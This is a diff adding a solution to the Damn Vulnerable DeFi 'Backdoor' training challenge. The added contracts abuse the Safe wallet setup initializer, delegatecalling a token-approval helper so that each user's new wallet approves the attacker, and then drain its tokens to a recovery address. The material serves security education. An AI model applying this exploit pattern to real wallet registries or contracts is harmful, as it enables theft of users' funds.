@@ -71,6 +71,9 @@ contract BackdoorChallenge is Test {
      */
     function test_backdoor() public checkSolvedByPlayer {
         
+
+        // Ref: https://github.com/PitrikYan/DamnVulnerableDefi-V4/blob/main/test/backdoor/Backdoor.t.sol
+        new ExploitBackdoor(token, walletFactory,walletRegistry, singletonCopy, users, recovery);
     }
 
     /**
@@ -92,5 +95,58 @@ contract BackdoorChallenge is Test {
 
         // Recovery account must own all tokens
         assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
+    }
+}
+
+import {IProxyCreationCallback} from "@safe-global/safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
+import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
+
+contract ExploitBackdoor{
+    constructor(
+        DamnValuableToken token, 
+        SafeProxyFactory walletFactory, 
+        WalletRegistry walletRegistry, 
+        Safe singletonCopy, 
+        address[] memory users,
+        address recovery ){
+
+        TokenApprover tokenApprover = new TokenApprover();
+        bytes memory data =
+            abi.encodeWithSelector(TokenApprover.approveDvt.selector, address(token), address(this), 10 ether);
+        console.log(users.length);
+        for (uint256 i = 0; i < users.length; i++) {
+            /*
+            DATA FOR INITIALIZE PROXY (setup function)
+                address[] calldata _owners,
+                uint256 _threshold,
+                address to,              -->>> approver contract for DVT approval
+                bytes calldata data,     -->>> calldata for approver
+                address fallbackHandler,
+                address paymentToken,
+                uint256 payment,
+                address payable paymentReceiver
+            */
+
+            address[] memory owners = new address[](1);
+            owners[0] = users[i];
+
+            bytes memory initializer = abi.encodeWithSelector(
+                Safe.setup.selector, owners, 1, address(tokenApprover), data, address(0), address(0), 0, address(0)
+            );
+
+            SafeProxy proxy = walletFactory.createProxyWithCallback(
+                address(singletonCopy), initializer, 0, IProxyCreationCallback(address(walletRegistry))
+            );
+
+            // Transfer funds prom new wallet (proxy of it) to the recovery account
+            token.transferFrom(address(proxy), recovery, 10 ether);
+        }
+    }
+}
+
+contract TokenApprover {
+    // here cannost be declared the "token" address because approveDvt is called by delegatecall from the proxy and first variable is the proxy address
+    function approveDvt(address _token, address _spender, uint256 _amount) external {
+        DamnValuableToken(_token).approve(_spender, _amount);
     }
 }
